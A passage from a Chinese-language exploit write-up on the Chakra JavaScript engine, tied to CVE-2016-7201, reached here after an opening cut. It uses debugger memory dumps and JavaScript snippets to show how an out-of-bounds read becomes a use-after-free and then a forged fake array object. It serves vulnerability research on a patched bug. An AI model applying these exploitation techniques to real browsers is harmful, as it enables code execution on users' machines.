    {
    return RecyclableObject::Is(aValue) &&
    (VirtualTableInfo::HasVirtualTable(aValue) ||
    VirtualTableInfo::HasVirtualTable(aValue) ||
    VirtualTableInfo::HasVirtualTable(aValue));
    }
在IsDirectAccessArray中会很干净的判断aValue指向的数据是否为特定的vtable，不会操作其他字段，返回结果为TRUE或FALSE。在JavascriptArray::ConcatArgs中引用了IsDirectAccessArray这个函数，并且根据它的返回结果进入不同的处理流程，最终IsDirectAccessArray的返回值可以在js层面被间接的探知到。
伪代码:
    for (addr = offset_arrVtable; addr  dq 000002e7`4bfe7de0
    000002e7`4bfe7de0 00007ffd`5b7433f0 000002e7`4bfa1380
    000002e7`4bfe7df0 00000000`00000000 00000000`00000005
    000002e7`4bfe7e00 00000000`00000010 000002e7`4bfe7e20
    000002e7`4bfe7e10 000002e7`4bfe7e20 000002e7`4bf6c6a0
    000002e7`4bfe7e20 00000010`00000000 00000000`00000012
    000002e7`4bfe7e30 00000000`00000000 77777777`77777777
    000002e7`4bfe7e40 77777777`77777777 77777777`77777777
    000002e7`4bfe7e50 77777777`77777777 77777777`77777777
2.分配由MemGC维护的Object2，其中有Object1+XXX位置的引用:
    0:023> dq 000002e7`4bfe40a0
    000002e7`4bfe40a0 00000003`00000000 00000000`00000011
    000002e7`4bfe40b0 00000000`00000000 000002e7`4c063950
    000002e7`4bfe40c0 000002e7`4bfe7de8 00010000`00000003
    000002e7`4bfe40d0 80000002`80000002 80000002`80000002
    000002e7`4bfe40e0 80000002`80000002 80000002`80000002
    000002e7`4bfe40f0 80000002`80000002 80000002`80000002
    000002e7`4bfe4100 80000002`80000002 80000002`80000002
    000002e7`4bfe4110 80000002`80000002 80000002`80000002
3.释放Object1，并且触发CollectGarbage，可以看到被链入freelist:
    0:023> dq 000002e7`4bfe7de0
    000002e7`4bfe7de0 000002e7`4bfe7d41 00000000`00000000
    000002e7`4bfe7df0 00000000`00000000 00000000`00000000
    000002e7`4bfe7e00 00000000`00000000 00000000`00000000
    000002e7`4bfe7e10 00000000`00000000 00000000`00000000
    000002e7`4bfe7e20 00000000`00000000 00000000`00000000
    000002e7`4bfe7e30 00000000`00000000 00000000`00000000
    000002e7`4bfe7e40 00000000`00000000 00000000`00000000
    000002e7`4bfe7e50 00000000`00000000 00000000`00000000
4.使用Object2引用释放的Object1:
    0:023> dq (000002e7`4bfe40a0+0x20) l1
    000002e7`4bfe40c0 000002e7`4bfe7de8
要把我们的bug转换成UAF，需要完成两件事情
1.找到一个对象的”内部指针”
2.将这个指针缓存，并可以通过JS层面引用
对于1，可以使用Head与Segment连在一起的Array
    000002e7`4bfe7de0 00007ffd`5b7433f0 000002e7`4bfa1380
    000002e7`4bfe7df0 00000000`00000000 00000000`00000005
    000002e7`4bfe7e00 00000000`00000010 000002e7`4bfe7e20 //指向对象内部的指针
    000002e7`4bfe7e10 000002e7`4bfe7e20 000002e7`4bf6c6a0
    000002e7`4bfe7e20 00000010`00000000 00000000`00000012
    000002e7`4bfe7e30 00000000`00000000 77777777`77777777
对于2，可以通过越界读的能力，将这个指针读入我们可控的Array
现在我们造出了一个UAF，接下来用什么数据结构来填充?
NativeIntArray/NativeFloatArray显然不可以，虽然数据完全可控，但目前我们无法做到信息泄露，所以数据也不知道填什么。
最后我选择了JavaScriptArray，后面会讲为何这样选择。
最终的UAF用JavaScriptArray占位成功后效果如下:
//before free&spray
    0000025d`f0296a80 00007ffe`dd2b33f0 0000025d`f0423040
    0000025d`f0296a90 00000000`00000000 00000000`00030005
    0000025d`f0296aa0 00000000`00000010 0000025d`f0296ac0
    0000025d`f0296ab0 0000025d`f0296ac0 0000025d`f021cc80
    0000025d`f0296ac0 00000010`00000000 00000000`00000012
    0000025d`f0296ad0 00000000`00000000 77777777`77777777
    0000025d`f0296ae0 77777777`77777777 77777777`77777777
    0000025d`f0296af0 77777777`77777777 77777777`77777777
    0000025d`f0296b00 77777777`77777777 77777777`77777777
    0000025d`f0296b10 77777777`77777777 77777777`77777777
//after free&spray
    0000025d`f0296a80 00000000 00000011 00000011 00000000
    0000025d`f0296a90 00000000 00000000 66666666 00010000
    0000025d`f0296aa0 66666666 00010000 66666666 00010000
    0000025d`f0296ab0 66666666 00010000 66666666 00010000
    0000025d`f0296ac0 >66666666 00010000 66666666 00010000
    0000025d`f0296ad0 66666666 00010000 66666666 00010000
    0000025d`f0296ae0 66666666 00010000 66666666 00010000
    0000025d`f0296af0 66666666 00010000 66666666 00010000
    0000025d`f0296b00 66666666 00010000 66666666 00010000
    0000025d`f0296b10 66666666 00010000 66666666 00010000
下面说下为何用JavaScriptArray占位。
因为Var Array可以存放对象，而判断是否为对象仅仅测试48位是否为0
    (((uintptr_t)aValue) >> VarTag_Shift) == 0
所以对于虚表、指针等都可以当做对象以原始形态存入Var Array，这对直接伪造出一个Object来说是极好的。
具体步骤如下:
1.通过越界读，读出下一个Array的vtable、type、segment三个字段。此时我们不知道它们具体的数值是多少，是作为对象缓存的
    var JavascriptNativeIntArray_segment = objarr[0]
    var JavascriptNativeIntArray_type = objarr[5]
    var JavascriptNativeIntArray_vtable = objarr[6]
2.构造UAF，并用fakeobj_vararr占位
    0000025d`f0296a80 00000000 00000011 00000011 00000000
    0000025d`f0296a90 00000000 00000000 66666666 00010000
    0000025d`f0296aa0 66666666 00010000 66666666 00010000
    0000025d`f0296ab0 66666666 00010000 66666666 00010000
    0000025d`f0296ac0 >66666666 00010000 66666666 00010000
    0000025d`f0296ad0 66666666 00010000 66666666 00010000
3.伪造对象
之前缓存的”内部指针”JavascriptNativeIntArray_segment指向的位置，对应fakeobj_vararr第五个元素的位置，如上所示
所以:
    fakeobj_vararr[5] = JavascriptNativeIntArray_vtable
    fakeobj_vararr[6] = JavascriptNativeIntArray_type
    fakeobj_vararr[7] = 0
    fakeobj_vararr[8] = 0x00030005
    fakeobj_vararr[9] = 0x1234
    fakeobj_vararr[10] = uint32arr
    fakeobj_vararr[11] = uint32arr
    fakeobj_vararr[12] = uint32arr
4.访问伪造的对象
    alert(JavascriptNativeIntArray_segment.length)
Exploit:
### 总结
本文描述了一些chakra脚本引擎中漏洞利用的技巧，分为三种不同的利用方式来体现，三种方式并不独立，可以融合成一个更精简稳定的exploit。所描述的bug最终在十一月补丁日，pwnfest前一天，同样被Natalie撞掉了，对应的信息为CVE-2016-7201，比赛最终使用的漏洞及利用方式，会在微软完成修补后讨论。
有问题，可以联系我:
**Weibo:@holynop**
* * *